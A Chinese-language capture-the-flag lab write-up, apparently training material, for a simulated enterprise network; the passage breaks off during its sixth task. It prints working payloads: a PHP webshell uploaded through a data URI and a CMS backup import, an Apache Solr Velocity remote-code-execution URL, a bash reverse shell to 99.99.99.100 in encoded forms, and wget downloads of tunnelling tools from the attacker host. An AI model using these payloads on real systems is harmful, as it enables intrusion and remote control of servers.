@@ -1,0 +1,1337 @@
+# 典型企业生产环境渗透赛
+
+[TOC]
+
+## 一、靶场介绍
+
+#### 1.场景介绍
+
+新时代下，云、大、物、移、智等新一代信息技术得到快速发展与大范围应用，这一方便有利于推动传统制造业改造升级向智能工厂转型，促进海量信息互通共享，但另一方面，也带来部分负面影响，产生了一系统网络安全问题，如用户信息被窃取、黑客非法访问、木马病毒流行等。为提升企业员工的网络安全意识，提高安全团队的网络安全作战水平，题目采用模拟仿真综合渗透赛的模式，搭建了一个企业的网络环境，涉及多个前沿热门应用、及多层网络越级技术，模拟真实企业生产环境，涉及内网安全、反向代理、内网穿透、数据库安全等知识点，参赛选手以攻击者的身份，对模拟的企业网络环境进行内网渗透、内网穿透等操作。
+
+#### 2.场景拓扑
+
+![image-20221111144127169509-1669009255638543.png](img/典型企业生产环境渗透赛 Local.assets/6d516c24b05834c335c2d3f8dd4b9fb1.png)
+
+#### 3.攻击路线
+
+![image-20221111144305363921-1669009260373670.png](img/典型企业生产环境渗透赛 Local.assets/46332679cfde6d7dc11af143d5e15e5f.png)
+
+#### 4.知识点
+
+信息收集
+
+端口扫描
+
+目录扫描
+
+内网渗透
+
+连接代理
+
+反弹shell
+
+密码爆破
+
+文件上传漏洞
+
+MS14-068漏洞利用
+
+SCADA软件应用
+
+#### 5.CVE漏洞编号
+
+CVE-2016-3088
+
+CVE-2014-6324
+
+#### 6.Att&ck框架指标/Shield防御指标
+
+T1090 - 连接代理
+
+T1110 - 暴力破解
+
+T1595 - 主动扫描
+
+T1592 - 收集目标主机信息
+
+T1059 - 命令行界面
+
+T1203 - 利用客户端漏洞获取执行权限
+
+T1572 - 隧道协议
+
+T1105 - 远程文件拷贝
+
+T1132 - 数据编码
+
+T1072 - 利用第三方软件部署工具
+
+T1021 - 远程服务
+
+T1046 - 网络服务扫描
+
+T1040 - 网络嗅探
+
+T1083 - 文件与目录发现
+
+T1078 - 有效凭证
+
+T1136 - 创建账户
+
+T1098 - 账户修改、监控
+
+#### 7.Engage攻防模型
+
+SAC0004 - 网络威胁情报
+
+EAC0015 - 信息处理
+
+EAC0014 - 软件操作
+
+EAC0003 - 系统活动监控
+
+EAC0004 - 网络分析
+
+EAC0021 - 攻击向量迁移
+
+EAC0006 - 应用多样性
+
+## 二、靶场题解(Write up)
+
+#### 阶段一：DMZ区渗透测试
+
+##### 任务1：目标网络探测(T1595 - 主动扫描、T1040 - 网络嗅探、T1046 - 网络服务扫描)
+
+```
+本场景的第1个任务是通过工具对目标网站进行端口扫描，收集可利用信息。
+
+Nmap（也就是Network Mapper，最早是Linux下的网络扫描和嗅探工具包）是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（亦称 fingerprinting）。
+
+该任务可以通过以下操作完成。
+```
+
+进入`Kali_tools`主机，在桌面右键点击`Open Termianl Here`打开终端，对目标网段进行探测：
+
+```
+nmap 192.168.10.0/24
+```
+
+发现存活主机及其端口信息：
+
+![image-20221118112018477677-1669009261606982.png](img/典型企业生产环境渗透赛 Local.assets/e7f2c1de3d98dfa35236c6ec19e0a417.png)
+
+进入`Win10_tools`主机的`C:\Users\Administrator\AppData\Local\Rolan\Intranet\IP_Portscan\S.scan`目录，在该目录地址栏输入cmd并回车启动命令行，执行命令使用s扫描器对存活主机进行端口扫描：
+
+```
+s.exe tcp 192.168.10.1 1-10000
+
+s.exe tcp 192.168.10.110 1-10000
+
+s.exe tcp 192.168.10.111 1-10000
+
+s.exe tcp 192.168.10.254 1-10000
+```
+
+![image-20221109102714057158-1669009262806369.png](img/典型企业生产环境渗透赛 Local.assets/03ddb06eaa5cd6962b43247ea1a31e1c.png)
+
+![image-20221109102833850173-1669009264031526.png](img/典型企业生产环境渗透赛 Local.assets/6b23d5fcd2d404fcea2ac864f1e1c1f9.png)
+
+![image-20221109102950468224-1669009265256169.png](img/典型企业生产环境渗透赛 Local.assets/812483cb45cff459a064965d1ad7608b.png)
+
+![image-20221109103111374280-1669009266594281.png](img/典型企业生产环境渗透赛 Local.assets/f861a9d1dfb5e41f5fb11d64649a691b.png)
+
+发现`192.168.10.254`主机开放https服务，在`Kali_tools`主机中启动浏览器进行访问：
+
+![image-20221118112103360929-1669009267817923.png](img/典型企业生产环境渗透赛 Local.assets/cc7a4abbd55fa540135472440fe1ae89.png)
+
+![image-20221118152248905563-1669009269017936.png](img/典型企业生产环境渗透赛 Local.assets/07cd8e8aab7bee056f46117be84aedd6.png)
+
+![image-20221118112200516276-1669009270243658.png](img/典型企业生产环境渗透赛 Local.assets/d23416b4619a0fe6b99bb1af78af6ef2.png)
+
+发现山石防火墙，尝试使用默认密码`hillstone/hillstone`登录：
+
+![image-20221118112927248583-1669009271582749.png](img/典型企业生产环境渗透赛 Local.assets/50a1fd408cc853f2ff33a333afd4ae6d.png)
+
+在`Object`>>`Host Book`中发现flag：
+
+```
+flag{9877-DD30-1335-C9C9-B4F9-0E8C-CC13-5FA4}
+```
+
+![image-20221108152755966589-1669009272893734.png](img/典型企业生产环境渗透赛 Local.assets/e5b226c88d394225f131ce5248bf78a1.png)
+
+扫描结果显示`192.168.10.111`主机开放8080，8888端口，进入`Win10_tools`打开火狐浏览器访问目标8888端口：
+
+![image-20221107161823940462-1669009274089373.png](img/典型企业生产环境渗透赛 Local.assets/0d79b90e9745d5cc682fe0adbadd951e.png)
+
+##### 任务2：Web1getshell(T1203 - 利用客户端漏洞获取执行权限、T1083 - 文件与目录发现)
+
+```
+本场景的第2个任务是构造一句话木马并上传至web1目录，通过蚁剑获取webshell。
+
+中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。
+
+该任务可以通过以下操作完成。
+```
+
+注册账号并登录：
+
+![image-20221107161843762455-1669009275344716.png](img/典型企业生产环境渗透赛 Local.assets/d18bb9f7630cb273d19cc2e6ab0a3ee5.png)
+
+![image-20221107165902980495-1669009276659043.png](img/典型企业生产环境渗透赛 Local.assets/3b09cf57912b86e13f828d7267d44eef.png)
+
+使用一句话木马：
+
+```
+<?php $arr = [$_POST["cmd"],$_REQUEST["cmd"]];@assert($arr[mt_rand(0,1)]);?>
+```
+
+进行base64编码：
+
+```
+PD9waHAgJGFyciA9IFskX1BPU1RbImNtZCJdLCRfUkVRVUVTVFsiY21kIl1dO0Bhc3NlcnQoJGFyclttdF9yYW5kKDAsMSldKTs/Pg==
+```
+
+![image-20221107170046087919-1669009277865311.png](img/典型企业生产环境渗透赛 Local.assets/ea573c0620c0a203bda8120e4e58cd74.png)
+
+在火狐浏览器上输入：
+
+```
+Load URL：
+
+http://192.168.10.111:8888/index.php?s=member&c=account&m=upload
+
+Post data：
+
+tx=data:image/phtml;base64,PD9waHAgJGFyciA9IFskX1BPU1RbImNtZCJdLCRfUkVRVUVTVFsiY21kIl1dO0Bhc3NlcnQoJGFyclttdF9yYW5kKDAsMSldKTs/Pg==
+```
+
+![image-20221107170156506119-1669009279094087.png](img/典型企业生产环境渗透赛 Local.assets/dece7dbcf62bb9483a4e958d656deb12.png)
+
+点击`execute`，显示如下说明写入成功：
+
+![image-20221108153046437834-1669009280292152.png](img/典型企业生产环境渗透赛 Local.assets/e4fc69a1ceed91f74c7f3bd86377c114.png)
+
+木马植入成功后访问其存在位置：
+
+```
+Load URL：
+
+http://192.168.10.111:8888/uploadfile/member/X/0x0.phtml 
+
+##X范围0~9，由于木马的目录是随机生成的，请依次尝试。
+
+Post data：
+
+cmd=phpinfo();
+```
+
+点击`execute`。
+
+![image-20221108101244596030-1669009281529300.png](img/典型企业生产环境渗透赛 Local.assets/46af2ced63ead18d05188aa533642a10.png)
+
+打开蚁剑工具：
+
+![image-20211111142241625696-1669009282738900.png](img/典型企业生产环境渗透赛 Local.assets/0ce6069f01f9e5db7c47e2d22414acdd.png)
+
+尝试使用蚁剑连接，编码格式选择`base64`：
+
+```
+Shell url:http://192.168.10.111:8888/uploadfile/member/X/0x0.phtml
+
+shell pwd:cmd
+
+Encoder:base64
+```
+
+右键空白处点击`Add`，shell信息如下：
+
+![image-20221108153300159930-1669009283969284.png](img/典型企业生产环境渗透赛 Local.assets/fc64e8cadc02cd6a8cd44683f3ccee26.png)
+
+点击`Add`后双击URL进入文件目录，在`C:/inetpub/wwwroot/flag/`目录下发现`flag.txt`文件，获取flag：
+
+```
+flag{D973-F169-44C8-7CC2-4ECB-2F76-389B-15B6}
+```
+
+![image-20221108153527848575-1669009285215016.png](img/典型企业生产环境渗透赛 Local.assets/9896ad6da5ace8ace51255b718c59674.png)
+
+在`C:/inetpub/wwwroot/config/`目录下发现数据库配置文件`database.php`，获取配置信息：
+
+![image-20221108153927210433-1669009286420513.png](img/典型企业生产环境渗透赛 Local.assets/80710e70ee7143754463fa567fb42f90.png)
+
+回到`Shell List`面板，右键URL点击`>_ Terminal`打开终端，输入命令查看当前用户信息：
+
+```
+whoami   
+```
+
+![image-20221108095459106667-1669009287697183.png](img/典型企业生产环境渗透赛 Local.assets/5c1e471b9f254ecc31a34a47c7a912e5.png)
+
+##### 任务3：Web2getshell(T1203 - 利用客户端漏洞获取执行权限、T1083 - 文件与目录发现)
+
+```
+本场景的第3个任务是利用web2的文件上传漏洞获取主机webshell。
+
+文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器。显然这种漏洞是getshell最快最直接的方法之一，需要说明的是上传文件操作本身是没有问题的，问题在于文件上传到服务器后，服务器怎么处理和解释文件。
+
+该任务可以通过以下操作完成。
+```
+
+使用火狐浏览器访问目标8080端口：
+
+![image-20221108100827293006-1669009288895628.png](img/典型企业生产环境渗透赛 Local.assets/583897550686bdcb6dc5c675413608d0.png)
+
+快捷键`Alt+Shift+U`查看网页源码，末尾发现是`TinyRise`的CMS，该CMS存在文件包含漏洞。
+
+![image-20211112133225306937-1669009290206465.png](img/典型企业生产环境渗透赛 Local.assets/fcf8109eb581868633ca4cc213576002.png)
+
+在首页点击`登录`进入用户登录界面：
+
+![image-20211112133316639162-1669009291434404.png](img/典型企业生产环境渗透赛 Local.assets/4df7b1396652b17e7367166bfb443742.png)
+
+在地址栏发现是普通用户登录地址。
+
+![image-20221108154535427450-1669009292636810.png](img/典型企业生产环境渗透赛 Local.assets/6e852996e51fdba051b69412c37246d5.png)
+
+将`simple`替换成`admin`，访问管理员登录界面：
+
+![image-20221108154558920412-1669009293860176.png](img/典型企业生产环境渗透赛 Local.assets/9623c9938d937156023cf9f7309e9e29.png)
+
+尝试弱口令登录，使用`admin/admin888`登录成功：
+
+![image-20221108154642085400-1669009295053752.png](img/典型企业生产环境渗透赛 Local.assets/7ec443b046e3ff2a2f4a8b744b2298f5.png)
+
+点击`系统设置`>>`数据库管理`>>`数据库备份`，勾选 `tiny_help`。
+
+![image-20221121094021590020-1669009296366813.png](img/典型企业生产环境渗透赛 Local.assets/c7c89f8df3d2cbf42835282390913f4f.png)
+
+点击最上方的`备份`。
+
+![image-20211112133649829572-1669009297588837.png](img/典型企业生产环境渗透赛 Local.assets/efdc8cf5037bd7645a87956514844bba.png)
+
+备份之后点击`处理`>>`下载`，将文件下载到桌面。
+
+![image-20211112133722292875-1669009298769621.png](img/典型企业生产环境渗透赛 Local.assets/012fde67a1fc7216303a7ca36492c3f1.png)
+
+编辑下载的文件，找到`配送范围`，写入一句话免杀木马并保存：
+
+```
+<?php $arr = [$_POST["cmd"],$_REQUEST["cmd"]];@assert($arr[mt_rand(0,1)]);?>
+```
+
+![image-20211112133755415725-1669009300000260.png](img/典型企业生产环境渗透赛 Local.assets/97e5a828419da8cdefa65cea091a41fe.png)
+
+回到浏览器界面点击`导入`，选择刚下载并修改的文件进行`上传`：
+
+![image-20211112133831032224-1669009301172098.png](img/典型企业生产环境渗透赛 Local.assets/496811762683d5c749240c7da093bb0d.png)
+
+点击`系统设置`>>`安全管理`>>`清除缓存`>>`全部清理缓存`：
+
+![image-20211112133910192061-1669009302404425.png](img/典型企业生产环境渗透赛 Local.assets/62278e8d8e8fa6cfca4de2774ff979c5.png)
+
+点击`内容管理`>>`全部帮助`>>`用户注册协议`：
+
+![image-20211015095529975209-1669009303624382.png](img/典型企业生产环境渗透赛 Local.assets/e2df18158904064827dba1fdeb1fcc98.png)
+
+点击后跳转到新界面。
+
+![image-20211015100042200410-1669009305016602.png](img/典型企业生产环境渗透赛 Local.assets/fdeccb4e2571b3de31ae78f3f3398e7f.png)
+
+打开新的标签页，测试木马是否上传成功：
+
+```
+Load URL：
+
+http://192.168.10.111:8080/cache/325/532/5862.php
+
+Post data：
+
+cmd=phpinfo();
+```
+
+![image-20221109144414485512-1669009306480656.png](img/典型企业生产环境渗透赛 Local.assets/76ac6ca0185500d3c3a226ce01acb612.png)
+
+通过蚁剑连接：
+
+```
+Shell url:http://192.168.10.111:8080/cache/325/532/5862.php
+
+shell pwd:cmd
+
+Encoder:base64
+```
+
+![image-20221108155505687630-1669009307654997.png](img/典型企业生产环境渗透赛 Local.assets/8dde1c1cf5b531e49a1e1233691d3651.png)
+
+获取到数据库配置信息：
+
+![image-20211015101508738338-1669009308859682.png](img/典型企业生产环境渗透赛 Local.assets/d487325d323ca12f0d1afd8913fbad88.png)
+
+在`C:/Users/Public/Documents`目录下发现`zabbix.xsh`文件：
+
+![image-20211015104851292372-1669009310067051.png](img/典型企业生产环境渗透赛 Local.assets/96702b09ec16464be3d88c3b24b3848a.png)
+
+发现zabbix的连接信息，获取内网地址：
+
+![image-20211015105052642501-1669009311277663.png](img/典型企业生产环境渗透赛 Local.assets/514e7bd432e7654689d785121845a357.png)
+
+##### 任务4：服务器权限获取(T1203 - 利用客户端漏洞获取执行权限、T1059 - 命令行界面、T1132 - 数据编码)
+
+    本场景的第4个任务是利用应用服务器漏洞反弹shell获取命令执行权限。
+    
+    Solr是Apache Lucene项目的开源企业搜索平台。其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成，以及富文本的处理。Solr是用Java编写、运行在Servlet容器（如Apache Tomcat或Jetty）的一个独立的全文搜索服务器。 Solr采用了Lucene Java搜索库为核心的全文索引和搜索，并具有类似REST的HTTP/XML和JSON的API。Apache Solr 5.0.0版本至8.3.1版本中存在输入验证错误漏洞，攻击者可借助Velocity模板利用该漏洞在系统上执行任意代码。
+    
+    该任务可以通过以下操作完成。
+
+主机`192.168.10.110`开放8983端口，回到`Kali_tools`主机，使用浏览器访问 `http://192.168.10.110:8983` ，发现Solr服务：
+
+![image-20221109144732139268-1669009312501639.png](img/典型企业生产环境渗透赛 Local.assets/6323a8af3fa24913b82df6f661a505ad.png)
+
+点击`Core Admin`，获取Core路径：
+
+![image-20221109144747173513-1669009313671382.png](img/典型企业生产环境渗透赛 Local.assets/2f2e647a72bb60d1522bb0c6ca3c7312.png)
+
+访问 `http://192.168.10.110:8983/solr/new_core/config` 查看配置信息，在页面中搜索关键字`params.resource.loader.enabled`，查看该值是否为true，默认为false：
+
+![image-20221109144926094268-1669009315093025.png](img/典型企业生产环境渗透赛 Local.assets/6c0d9147bcf36e8bfa761fd79dbcad25.png)
+
+设置浏览器代理：
+
+![image-20221118113320346601-1669009316356017.png](img/典型企业生产环境渗透赛 Local.assets/d74b7215a11fc137befe2d7712a4254c.png)
+
+![image-20221118113335734892-1669009317562290.png](img/典型企业生产环境渗透赛 Local.assets/3e0fd3802c9d4d3ce66cc586ae041717.png)
+
+![image-20221118113402586790-1669009318776532.png](img/典型企业生产环境渗透赛 Local.assets/0dd3c0cc45b71e350958f3e0db78871e.png)
+
+启动抓包工具burpsuite：
+
+![image-20221121094721153151-1669009319955224.png](img/典型企业生产环境渗透赛 Local.assets/11ba477b373015132fc8d5145f2e7f79.png)
+
+![image-20221121094740869121-1669009321172553.png](img/典型企业生产环境渗透赛 Local.assets/0c723f91092b4b9f1faab2bdd0dfa2a2.png)
+
+![image-20221121094808401453-1669009322340596.png](img/典型企业生产环境渗透赛 Local.assets/07d162bd630042e1afd3120e56f7d3af.png)
+
+![image-20221121094819918346-1669009323560870.png](img/典型企业生产环境渗透赛 Local.assets/cc5b75db9b1317cc9ab78b863a79cda4.png)
+
+![image-20221121094830077695-1669009324764666.png](img/典型企业生产环境渗透赛 Local.assets/ed6772e00b858f2570f189142cffae65.png)
+
+![image-20221121094854298548-1669009325945325.png](img/典型企业生产环境渗透赛 Local.assets/904288c002a61c9304fd979e059eec03.png)
+
+![image-20221121094912587320-1669009327160742.png](img/典型企业生产环境渗透赛 Local.assets/6ad21c3d7feb37c4478bef11998430bb.png)
+
+对`http://192.168.10.110:8983/solr/new_core/config` 进行抓包，浏览器中刷新该标签页：
+
+![image-20221121094940594321-1669009328325409.png](img/典型企业生产环境渗透赛 Local.assets/10d6b032fc492ac83afafda74de0d559.png)
+
+将抓到的数据包发送到`Repeater`：
+
+![image-20221121095012072227-1669009329593072.png](img/典型企业生产环境渗透赛 Local.assets/94af05d43eaded59803afdab4f6089b4.png)
+
+进入`Repeater`：
+
+![image-20221121095026407188-1669009330784294.png](img/典型企业生产环境渗透赛 Local.assets/6484cf7316f227599b2385ee6e05ff6d.png)
+
+`params.resource.loader.enabled`默认为false，尝试向该页面发送post请求；
+
+修改请求包方法：
+
+![image-20221121095048433974-1669009332231026.png](img/典型企业生产环境渗透赛 Local.assets/fba0609a980682c1464ab39cb9630499.png)
+
+修改`Content-Type`的值为`application/json`：
+
+![image-20221121095117652355-1669009333620206.png](img/典型企业生产环境渗透赛 Local.assets/ec39c430666f37023f19ad29988baae6.png)
+
+加入请求体后点击`Send`：
+
+```
+{
+  "update-queryresponsewriter": {
+    "startup": "lazy",
+    "name": "velocity",
+    "class": "solr.VelocityResponseWriter",
+    "template.base.dir": "",
+    "solr.resource.loader.enabled": "true",
+    "params.resource.loader.enabled": "true"
+  }
+}
+```
+
+![image-20221121095136678406-1669009334834663.png](img/典型企业生产环境渗透赛 Local.assets/02cb267db1f28613acb7722f8ac52a3b.png)
+
+返回200后关闭抓包：
+
+![image-20221121095256391692-1669009336079768.png](img/典型企业生产环境渗透赛 Local.assets/239d59df1f45913ac34990c07541ea10.png)
+
+![image-20221121095311780340-1669009337269887.png](img/典型企业生产环境渗透赛 Local.assets/edb87eb44204d7f41a47d8bccae500a2.png)
+
+浏览器中再次访问`http:192.168.10.110:8983/solr/new_core/config`，发现`params.resource.loader.enabled`的值已经变为了true:
+
+![image-20221109145715646211-1669009338479347.png](img/典型企业生产环境渗透赛 Local.assets/35292160c22834db9a674b44aaf81d13.png)
+
+通过Velocity模板即可执行任意命令，浏览器中访问如下内容：
+
+```
+http://192.168.10.110:8983/solr/new_core/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27id%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
+```
+
+![image-20221109145744753494-1669009339671333.png](img/典型企业生产环境渗透赛 Local.assets/604e532ab41cb5fe8c86bcafae15a019.png)
+
+在`Kali_tools`主机中新建终端，使用MSF建立监听：
+
+```
+msfconsole
+use exploit/multi/handler
+set lhost 99.99.99.100
+set lport 1234
+run
+```
+
+![image-20221109145917047923-1669009340860287.png](img/典型企业生产环境渗透赛 Local.assets/d7768e2ad5bd2c7470e36148f3e0e4e8.png)
+
+反弹shell原始命令如下：
+
+```
+bash -c "bash -i >& /dev/tcp/99.99.99.100/1234 0>&1"
+```
+
+在burpsuite中将该命令进行base64编码：
+
+![image-20221109150024852082-1669009342080895.png](img/典型企业生产环境渗透赛 Local.assets/6ddf768298e2fcb55b322e7cca1b9444.png)
+
+```
+YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC85OS45OS45OS4xMDAvMTIzNCAwPiYxIg==
+```
+
+将编码后的bash命令拼接成JAVA可识别的格式：
+
+```
+bash -c {echo,YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC85OS45OS45OS4xMDAvMTIzNCAwPiYxIg==}|{base64,-d}|{bash,-i}
+```
+
+将-c前后的空格替换为+号：
+
+```
+bash+-c+{echo,YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC85OS45OS45OS4xMDAvMTIzNCAwPiYxIg==}|{base64,-d}|{bash,-i}
+```
+
+将执行内容（第二个+号后面的内容）进行url编码：
+
+![image-20221109150142648875-1669009343356363.png](img/典型企业生产环境渗透赛 Local.assets/a03b2d3ceff39cfb0835da5cf5084dd7.png)
+
+```
+%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%59%79%41%69%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%35%4f%53%34%35%4f%53%34%35%4f%53%34%78%4d%44%41%76%4d%54%49%7a%4e%43%41%77%50%69%59%78%49%67%3d%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d
+```
+
+拼接后如下：
+
+```
+bash+-c+%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%59%79%41%69%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%35%4f%53%34%35%4f%53%34%35%4f%53%34%78%4d%44%41%76%4d%54%49%7a%4e%43%41%77%50%69%59%78%49%67%3d%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d
+```
+
+在浏览器中访问：
+
+```
+http://192.168.10.110:8983/solr/new_core/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27id%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27bash+-c+%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%59%79%41%69%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%35%4f%53%34%35%4f%53%34%35%4f%53%34%78%4d%44%41%76%4d%54%49%7a%4e%43%41%77%50%69%59%78%49%67%3d%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
+```
+
+![image-20221109150301466853-1669009344626224.png](img/典型企业生产环境渗透赛 Local.assets/1fd9f4b08831f657d63d50d52755c6a5.png)
+
+MSF监听中获取到反弹shell：
+
+![image-20221109150318161369-1669009345925568.png](img/典型企业生产环境渗透赛 Local.assets/3e919fda1301bdb2b313e4ee0b62ea62.png)
+
+查看当前用户信息：
+
+![image-20221109150357153486-1669009347245454.png](img/典型企业生产环境渗透赛 Local.assets/f96613c5167b2374171554caea996a65.png)
+
+查找flag并获取：
+
+```
+find / -name flag.txt
+```
+
+![image-20221109150534148040-1669009348544108.png](img/典型企业生产环境渗透赛 Local.assets/33382ba827f8475bed64599db2866a6b.png)
+
+```
+flag{B9CF-CBAF-76F0-7C31-F3AA-AE2C-D6E6-C2BD}
+```
+
+查看系统结构：
+
+```
+uname -a
+```
+
+![image-20221109152056579080-1669009349771314.png](img/典型企业生产环境渗透赛 Local.assets/e16bb785bbbceebfc065a142dd5f783b.png)
+
+#### 阶段二：内网服务区渗透测试
+
+##### 任务5：搭建内网隧道(T1090 - 连接代理、T1572 - 隧道协议)
+
+```
+本场景的第5个任务是使用代理工具搭建隧道连接内网。
+
+frp是一个开源、简洁易用、高性能的内网穿透和反向代理软件，支持tcp, udp, http, https等协议。
+
+该任务可以通过以下操作完成。
+```
+
+进入`Kali_tools`主机的`/root/Desktop/Tools/frp/frp_0.37.1_linux_amd64/`目录，修改`frpc.ini`文件为如下内容：
+
+```
+[common]
+server_addr = 99.99.99.100
+server_port = 7000
+
+[ssh]
+type = tcp
+remote_port = 9998
+plugin = socks5
+```
+
+![image-20221121095954396890-1669009351005809.png](img/典型企业生产环境渗透赛 Local.assets/4b33bc36cb2f2804d911145fc39683f1.png)
+
+在`/root/Desktop/Tools/frp/frp_0.37.1_linux_amd64/`目录下打开终端，执行命令启动代理服务端：
+
+```
+chmod +x frps
+
+./frps -c ./frps.ini
+```
+
+![image-20221121095926797138-1669009352216397.png](img/典型企业生产环境渗透赛 Local.assets/698f4918d52e7d5adc2e0bd5c7651df4.png)
+
+在`/root/Desktop/Tools/frp/frp_0.37.1_linux_amd64/`目录下打开新的终端，执行命令建立http服务：
+
+```
+python3 -m http.server 8000
+```
+
+![image-20221121100040466457-1669009353451047.png](img/典型企业生产环境渗透赛 Local.assets/fc31e5b5c3edf6f1a42bf0cf29ee90ce.png)
+
+在反弹的shell中执行命令下载代理工具：
+
+```
+wget http://99.99.99.100:8000/frpc
+
+wget http://99.99.99.100:8000/frpc.ini
+```
+
+![image-20221109153402658930-1669009354723886.png](img/典型企业生产环境渗透赛 Local.assets/71ecb041c5271fd52da0459c2c561fc7.png)
+
+执行命令启动代理客户端：
+
+```
+chmod +x frpc
+
+./frpc -c ./frpc.ini
+```
+
+![image-20221109154053466930-1669009355907438.png](img/典型企业生产环境渗透赛 Local.assets/f4bb9964a2b0aa1a164aacbe6f8334ec.png)
+
+代理隧道建立成功：
+
+![image-20221121100150734709-1669009357267128.png](img/典型企业生产环境渗透赛 Local.assets/35ba08f34832eb73803da87513fb2ac6.png)
+
+在`Kali_tools`主机的终端中执行命令修改代理规则：
+
+```
+vim /etc/proxychains4.conf
+```
+
+![image-20221121100316941799-1669009358418520.png](img/典型企业生产环境渗透赛 Local.assets/aba33a4dd8f4cc5c5fa405e4863b4e9d.png)
+
+测试代理有效性，访问内网主机：
+
+```
+proxychains4 curl 192.168.12.50
+```
+
+![image-20221121100359829143-1669009359608199.png](img/典型企业生产环境渗透赛 Local.assets/f0502a92a34e41123a66ae2ab919206f.png)
+
+进入`Win10_tools`主机，在蚁剑终端中执行命令对内网地址段进行存活主机探测：
+
+```
+for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.12.%I | findstr "TTL"  >> 1.txt
+```
+
+稍等片刻后查看`1.txt`文件内容，发现存活主机：
+
+![image-20221110102057500671-1669009360804491.png](img/典型企业生产环境渗透赛 Local.assets/397bf9d8995b937c3429a789e8af43f7.png)
+
+回到`Kali_tools`主机，使用nmap对存活主机进行端口探测：
+
+```
+proxychains4 nmap -Pn -sT -p 22,80,443,445,3306,3389,8080,8888,8983 192.168.12.50
+```
+
+![image-20221110102515344019-1669009361985492.png](img/典型企业生产环境渗透赛 Local.assets/a8d18f24e0a77e496ed3b2b07407aa12.png)
+
+```
+proxychains4 nmap -Pn -sT -p 22,80,443,445,3306,3389,8080,8888,8983 192.168.12.55
+```
+
+![image-20221110102611815456-1669009363326422.png](img/典型企业生产环境渗透赛 Local.assets/159451af1b99e498b6bdcc6e4f199fed.png)
+
+发现`192.168.12.55`主机开放80端口后，回到`Win10_tools`主机启动本地代理软件`proxifier`，添加socks5代理：
+
+![image-20221108112118998677-1669009364499149.png](img/典型企业生产环境渗透赛 Local.assets/956612beab3f2adcbd0c1c9da7687e49.png)
+
+![image-20221108112141781725-1669009365689324.png](img/典型企业生产环境渗透赛 Local.assets/fb565fd5717ae27855b13824affdca5b.png)
+
+点击`Profile`>>`Proxy Servers...`>>`Add...`，代理服务器配置如下：
+
+![image-20221109173533515075-1669009366913978.png](img/典型企业生产环境渗透赛 Local.assets/777162ad5cfa286fec3b32b782c76e74.png)
+
+配置完成后点击`OK`>>`Yes`>>`OK`>>`OK`，设置为默认代理：
+
+![image-20211015154430405130-1669009368618842.png](img/典型企业生产环境渗透赛 Local.assets/1ed62ccfe7a63a321ace95a5d690c6d9.png)
+
+##### 任	务6：任意用户登录OA()
+
+```
+本场景的第6个任务是通过burpsuite工具使用任意用户登录OA后台界面。
+
+Burp Suite是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP消息、持久性、认证、代理、日志、警报。
+
+该任务可以通过以下操作完成。
+```
+
+通过火狐浏览器访问`http://192.168.12.55:80`，发现通达OA（后续OA利用过程中出现卡顿时请重建代理隧道，重启代理服务端frps服务后再继续操作）：
+
+![image-20221110103335203944-1669009369846464.png](img/典型企业生产环境渗透赛 Local.assets/2d214171296a6700f3c7218541e63f7e.png)
+
+启动burpsuite进行抓包。
+
+![image-20211112103842884415-1669009371011552.png](img/典型企业生产环境渗透赛 Local.assets/8c92336b6a092731cdd1c8eb8bef9be8.png)
+
+点击`Next`>>`Start Burp`启动burpsuite，启动后点击`Proxy`，可以看到拦截已开启，点击`Intercept is on`按钮让拦截处于关闭状态。
+
+![image-20211112104124158136-1669009372213767.png](img/典型企业生产环境渗透赛 Local.assets/d96b50fdcde4b9b33289636fd3bbf34a.png)
+
+回到火狐浏览器，开启代理：
+
+![image-20221110103634239004-1669009373464682.png](img/典型企业生产环境渗透赛 Local.assets/c701e0dcb4fb5b5f5fcc8edcea4dadd4.png)
+
+点击`Add New Proxy`新增代理记录，代理服务器为`127.0.0.1`，端口为`8080`，配置好后点击`OK`。
+
